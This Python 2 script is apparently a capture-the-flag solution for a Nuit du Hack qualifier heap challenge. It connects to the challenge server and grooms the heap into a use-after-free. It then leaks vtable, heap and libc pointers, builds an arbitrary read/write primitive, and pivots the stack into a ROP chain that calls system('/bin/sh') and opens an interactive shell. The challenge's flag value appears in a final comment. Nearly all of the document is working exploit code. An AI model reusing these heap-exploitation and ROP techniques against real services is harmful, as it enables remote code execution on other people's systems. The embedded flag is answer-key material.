import telnetlib, re, sys, struct
from time import sleep
from socket import * 

local = False
if local:
	host = 'localhost'
	port = 31337
else:
	host = 'nightdaemonicheap.quals.nuitduhack.com'
	port = 55550

connect = (host, port)
con=socket(AF_INET, SOCK_STREAM)
con.connect(connect)

stage1 = '''new barbarian OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
new barbarian 2
new barbarian 4
new barbarian 3
delete BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
new barbarian AAAAAAAAAAAAAAAAAAAAAAA\x01
new barbarian PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
change B3 '''+'Q'*0x100+'''
change B4 '''+'I'*(0100)+'''
delete BPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
delete B2
new barbarian vvvvvvvv
new barbarian kkkkkkkk
new barbarian yyyyyyyy
print all
delete Bvvvvvvvv
delete Bkkkkkkkk
delete Byyyyyyyy
new barbarian OverwriteM2
change BAAAAAAAAAAAAAAAAAAAAAAA\x01\x01 ''' + "Z"*(0x20) + '''
new barbarian =1;/bin/sh
print all'''

def sendcommand(com):
	sleep(0.1)
	con.send(com+"\n")
	sleep(0.7)
	return con.recv(4096)
def interact():
	sys.stdout.write("> ")
	sys.stdout.flush()
	con2 = telnetlib.Telnet()
	con2.sock=con
	con2.interact()

print "Shrinking heap and creating use-after-free state..."
leak_heap_pointer = ""
leak_pointer = ""
index = 0
for command in stage1.split("\n"):
	con.send(command+"\n")
	sleep(0.1)
	if "print all" in command:
		res = con.recv(1024)
		for row in res.split("\n"):
			if "My name is" in row:
				index = index + 1
				if index == 8:
					leak_mapped_pointer = row.split(":")[1][1:][-6:]
				if index == 7:					
					leak_heap_pointer = row.split(":")[1][1:]
				if index == 1:
					leak_pointer = row.split(":")[1][1:][-6:]


print "leak vtable pointer: 0x"+leak_pointer[::-1].encode("hex")
print "leak mapped pointer: 0x"+leak_mapped_pointer[::-1].encode("hex")
print "leak heap pointer: 0x"+leak_heap_pointer[::-1].encode("hex")

leaked = struct.unpack("<Q", (leak_pointer+"\x00"*8)[:8])[0]
leaked_heap = struct.unpack("<Q", (leak_heap_pointer+"\x00"*8)[:8])[0]
previous_where = leak_heap_pointer

def add_to_pointer(addr, num):
	unpacked = struct.unpack("<Q", (addr+"\x00"*8)[:8])[0]
	return struct.pack("<Q", unpacked+num)

def write_what_where(what, where):
	current = sendcommand("print all").split("\n")[2].split(":")[1][1:]
	sendcommand("change "+current+" "+where)
	string_at_where = sendcommand("print all").split("\n")[-8].split(":")[1][1:]
	if string_at_where == "" or "\n" in string_at_where or " " in string_at_where:
		print "CANNOT READ ADDRESS 0x"+where[::-1].encode("hex")+" ("+string_at_where+")!"
		raw_input()
		exit()
	sendcommand("change "+string_at_where+" "+what)

def leak(where):
	current = sendcommand("print all").split("\n")[2].split(":")[1][1:]
	sendcommand("change "+current+" "+where)
	string_at_where = sendcommand("print all").split("\n")[-8].split(":")[1][1:]
	return string_at_where

#libc addresses
exit_addr = leak(struct.pack("<Q", leaked+728+16))
exit = struct.unpack("<Q", (exit_addr+"\x00"*8)[:8])[0]
shift_stack = struct.pack("<Q", exit-17021) #add rsp, 0x90; pop+pop+pop+ret gadget
system = struct.pack("<Q", exit+42592)

if not local:
	system = struct.pack("<Q", exit+42768)
	shift_stack = struct.pack("<Q", exit-17374)

print "exit: " + hex(exit)
print "add_rsp90_pop3ret: 0x" + shift_stack[::-1].encode("hex")
print "system: 0x" + system[::-1].encode("hex")

print "system: [" + leak(system).encode("hex")+"]"
print "shift_stack: [" + leak(shift_stack).encode("hex")+"]"

#Used for leaking libc offsets :)
search = -17021+200
add = 0
y='''
searching... [ffff4881c490] (-17376)
ffff4881c490
-17376



print leak(add_to_pointer(exit_addr, -17374)).encode("hex")
print leak(add_to_pointer(exit_addr, -17370)).encode("hex")
print leak(add_to_pointer(exit_addr, -17369)).encode("hex")
print leak(add_to_pointer(exit_addr, -17368)).encode("hex")
print leak(add_to_pointer(exit_addr, -17367)).encode("hex")
print leak(add_to_pointer(exit_addr, -17366)).encode("hex")
print leak(add_to_pointer(exit_addr, -17365)).encode("hex")
raw_input(123)

while True:
	ret = leak(add_to_pointer(exit_addr, search+add)).encode("hex")
	print "searching... ["+ret+"] ("+str(search+add)+")"
	#if "4885ff74" in ret  or "0be986fa" in ret or "ffff660f" in ret or "0f1f44" in ret:#4885ff740be986faffff660f1f44
		#print ret
		#print search+add
		#raw_input("FOUND SYSTEM!")

	if "4881c490" in ret:#ffffffff4881c490
		print ret
		print search+add
		raw_input("FOUND STACK SHIFT")

	if len(ret)/2 == 0:
		add = add - 1
	else:
		add = add - len(ret)/2 - 1

raw_input(333)
'''

#heap addresses
barbarian_overwriteme_vtable = struct.pack("<Q", leaked_heap-(8*32)) #Address of barbarianOverwriteMe Vtable (print function)
end_of_AAAA = struct.pack("<Q", leaked_heap-(8*49)) #Some address we can write/read at (barbarian AAAA name)...
pop_rdi = struct.pack("<Q", leaked-2100693)
bin_sh = struct.pack("<Q", leaked_heap) #Will point to B=1;/bin/sh
print "bin_sh: 0x" + bin_sh[::-1].encode("hex")
print "pop_rdi: 0x" + pop_rdi[::-1].encode("hex")
print "pop_rdi: ["+leak(pop_rdi).encode("hex")+"]"

write_what_where(shift_stack, end_of_AAAA) #Since it does call [rax] we need a pointer to a pointer...
write_what_where(end_of_AAAA, barbarian_overwriteme_vtable)

print "Shifting stack..."
sendcommand("print allAAAAAAABBBBBBBBCCCCCCCC"+pop_rdi+bin_sh+system) #this will rop which will shift stack to after "CCCCCCC" then return.

print "Dropping shell..."
interact()
#cat /home/my_chall_pwned/flag
#He4p_H3ap$He4p?H0ur4\o/
